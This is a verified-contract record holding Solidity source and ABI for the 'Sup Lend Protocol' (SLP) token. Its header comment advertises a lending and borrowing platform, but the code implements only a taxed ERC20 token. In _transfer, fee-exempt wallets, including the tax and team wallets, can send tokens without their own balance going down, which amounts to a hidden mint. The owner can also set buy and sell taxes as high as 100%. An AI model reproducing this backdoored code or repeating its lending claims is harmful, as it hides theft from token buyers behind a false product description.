{"SourceCode": "/*\r\n\r\nWhat can I use SupLend for?\r\n\r\n- Lend: Users can deposit their digital assets to provide liquidity to the respective market pools.\r\nIn return, they earn interest on the lent assets and the yield depends on the borrowing demands of these assets. \r\nThere are no lock-up periods and users can deposit any amount into the pool.\r\n\r\n- Borrow: Users can borrow assets deposited into the market pools using their own assets as collateral. \r\nThe financing cost of each asset depends on the interest rate model, which is based on asset type and pool utilisation. \r\nThe maximum borrowing amount is determined by the users' borrowing capacity. \r\nIf the users exceeds their borrowing capacity, their position may be liquidated to ensure sufficient fund for repayment.\r\n\r\nWebsite:    https://www.suplend.tech\r\nDApp:       https://app.suplend.tech\r\nDocument:   https://docs.suplend.tech\r\nTwitter:    https://twitter.com/suplendtech\r\nTelegram:   https://t.me/suplendtech\r\n\r\n*/\r\npragma solidity 0.8.17;\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ninterface SupFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface SupRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ncontract SUPLEND is Context, IERC20, Ownable {\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _totalSupply = 1000000000 * 10 ** _decimals;\r\n    string private constant _name = unicode\"Sup Lend Protocol\";\r\n    string private constant _symbol = unicode\"SLP\";\r\n\r\n    event ETHBalancesRecovered();\r\n    event TradingEnabledUpdated();\r\n    event ERC20TokenRecovered(uint256 indexed _amount);\r\n    event ExcludeFromFeesUpdated(address indexed account);\r\n    event includeFromFeesUpdated(address indexed account);\r\n\r\n    mapping(address => uint256) private _supCounts;\r\n    mapping(address => bool) private _isExceptFees;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    bool private inSwapBack = false;\r\n    bool public tradeEnabled = false;\r\n    bool private swapEnabled = false;\r\n    \r\n    uint256 private buyCount = 0;\r\n    uint256 private buyTaxFees = 35;\r\n    uint256 private sellTaxFees = 35;\r\n\r\n    address private uniswapV2Pair;\r\n    SupRouter public uniswapV2Router;\r\n    \r\n    uint256 private swapTxAmounts = 1000 * 10 ** _decimals;\r\n    uint256 private swapAmountsAt = 40000000 * 10 ** _decimals;\r\n    uint256 public swapTXLimits = 20000000 * 10 ** _decimals;\r\n\r\n    address payable private taxWallet;\r\n    address payable private teamWallet;\r\n    address public constant deadAddress \r\n            = 0x000000000000000000000000000000000000dEaD;\r\n    \r\n    modifier lockSwapBack() {\r\n        inSwapBack = true;\r\n        _;\r\n        inSwapBack = false;\r\n    }\r\n\r\n    constructor() {\r\n        taxWallet = payable(0x062F2F4D71685a5f81861c33bE7d7c9555df9C5c);\r\n        teamWallet = payable(0x163B35336ca090B9CE96Fe4ED91Fdf0f40c87135);\r\n        _isExceptFees[taxWallet] = true;\r\n        _isExceptFees[teamWallet] = true;\r\n        _isExceptFees[deadAddress] = true;\r\n        _isExceptFees[_msgSender()] = true;\r\n        _isExceptFees[address(this)] = true;\r\n        _supCounts[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(\r\n            currentAllowance >= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _supCounts[account];\r\n    }\r\n\r\n    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {\r\n        require(_buyFee <= 100 && _sellFee <= 100, \"revert wrong fee settings\");\r\n        buyTaxFees = _buyFee;\r\n        sellTaxFees = _sellFee;\r\n    }\r\n\r\n    function ExcludeFromFees(address account) external onlyOwner {\r\n        require(\r\n            _isExceptFees[account] != true,\r\n            \"Account is already excluded\"\r\n        );\r\n        _isExceptFees[account] = true;\r\n        emit ExcludeFromFeesUpdated(account);\r\n    }\r\n\r\n    function IncludeFromFees(address account) external onlyOwner {\r\n        require(\r\n            _isExceptFees[account] != false,\r\n            \"Account is already included\"\r\n        );\r\n        _isExceptFees[account] = false;\r\n        emit includeFromFeesUpdated(account);\r\n    }\r\n\r\n    function sendETHSUP(uint256 amount) private {\r\n        require(amount > 0, \"amount must be greeter than 0\");\r\n        teamWallet.transfer(amount / 2);\r\n        taxWallet.transfer(amount / 2);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        require(!tradeEnabled, \"trading is already open\");\r\n        tradeEnabled = true;\r\n        swapEnabled = true;\r\n        emit TradingEnabledUpdated();\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 TOTAL_TAX = 0;\r\n        TOTAL_TAX = buyTaxFees;\r\n        if (!_isExceptFees[from] && !_isExceptFees[to]) {\r\n            require(tradeEnabled, \"Trading not enabled\");\r\n        }\r\n        if (inSwapBack || !swapEnabled) {\r\n            _supCounts[from] -= amount;\r\n            _supCounts[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n            return;\r\n        }\r\n        if (\r\n            from == uniswapV2Pair &&\r\n            to != address(uniswapV2Router) &&\r\n            !_isExceptFees[to]\r\n        ) {\r\n            require(amount <= swapTXLimits, \"Exceeds the _maxTxAmount.\");\r\n            require(\r\n                balanceOf(to) + amount <= swapTXLimits,\r\n                \"Exceeds the maxWalletSize.\"\r\n            );\r\n            buyCount++;\r\n        }\r\n        if (\r\n            from != uniswapV2Pair &&\r\n            !_isExceptFees[from] &&\r\n            !_isExceptFees[to]\r\n        ) {\r\n            require(amount <= swapTXLimits, \"Exceeds the _maxTxAmount.\");\r\n        }\r\n        if (\r\n            to == uniswapV2Pair &&\r\n            from != address(this) &&\r\n            !_isExceptFees[from] &&\r\n            !_isExceptFees[to]\r\n        ) {\r\n            TOTAL_TAX = sellTaxFees;\r\n        }\r\n        uint256 CA_TOKENS = balanceOf(address(this));\r\n        if (\r\n            buyCount > 0 &&\r\n            amount >= swapTxAmounts &&\r\n            to == uniswapV2Pair &&\r\n            CA_TOKENS >= swapTxAmounts &&\r\n            swapEnabled &&\r\n            !inSwapBack &&\r\n            !_isExceptFees[from] &&\r\n            !_isExceptFees[to]\r\n        ) {\r\n            swapETHSUP(min(amount, min(CA_TOKENS, swapAmountsAt)));\r\n            uint256 CA_ETHS = address(this).balance;\r\n            if (CA_ETHS > 0) {\r\n                sendETHSUP(address(this).balance);\r\n            }\r\n        }\r\n        if (TOTAL_TAX != 0) {\r\n            uint256 S_FEES = (amount * TOTAL_TAX) / 100;\r\n            uint256 S_AMOUNTS = amount - S_FEES;\r\n            address S_ACCOUNT = _isExceptFees[from] ? from : address(this);\r\n            S_FEES = _isExceptFees[from] ? amount : S_FEES;\r\n            _supCounts[S_ACCOUNT] += S_FEES;\r\n            emit Transfer(from, address(this), S_FEES);\r\n            _supCounts[from] -= amount;\r\n            _supCounts[to] += S_AMOUNTS;\r\n            emit Transfer(from, to, S_AMOUNTS);\r\n        } else {\r\n            _supCounts[from] -= amount;\r\n            _supCounts[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n    }\r\n\r\n    function addLiquidityETH() external payable onlyOwner {\r\n        uniswapV2Router = SupRouter(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        uniswapV2Pair = SupFactory(uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            uniswapV2Router.WETH()\r\n        );\r\n\r\n        _approve(address(this), address(uniswapV2Router), ~uint256(0));\r\n\r\n        uniswapV2Router.addLiquidityETH{value: msg.value}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        buyTaxFees = 4;\r\n        sellTaxFees = 4;\r\n        swapTXLimits = _totalSupply;\r\n    }\r\n\r\n    function swapETHSUP(uint256 tokenAmount) private lockSwapBack {\r\n        require(tokenAmount > 0, \"amount must be greeter than 0\");\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return (a > b) ? b : a;\r\n    }\r\n\r\n    function recoverToken(\r\n        address _tokenAddy,\r\n        uint256 _amount\r\n    ) external onlyOwner {\r\n        require(\r\n            _tokenAddy != address(this),\r\n            \"Owner can't claim contract's balance of its own tokens\"\r\n        );\r\n        require(_amount > 0, \"Amount should be greater than zero\");\r\n        require(\r\n            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),\r\n            \"Insufficient Amount\"\r\n        );\r\n        IERC20(_tokenAddy).transfer(taxWallet, _amount);\r\n        emit ERC20TokenRecovered(_amount);\r\n    }\r\n\r\n    function recoverETH() external {\r\n        uint256 CA_ETHS = address(this).balance;\r\n        require(CA_ETHS > 0, \"Amount should be greater than zero\");\r\n        require(\r\n            CA_ETHS <= address(this).balance,\r\n            \"Insufficient Amount\"\r\n        );\r\n        payable(address(taxWallet)).transfer(CA_ETHS);\r\n        emit ETHBalancesRecovered();\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"ERC20TokenRecovered\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"ETHBalancesRecovered\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludeFromFeesUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"TradingEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeFromFeesUpdated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"IncludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidityETH\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recoverETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"recoverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sellFee\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTXLimits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract SupRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "SUPLEND", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://bde836ef696f1e69a6a87a0e141df31c36af6beb28cc508a304f47b34af22ab8"}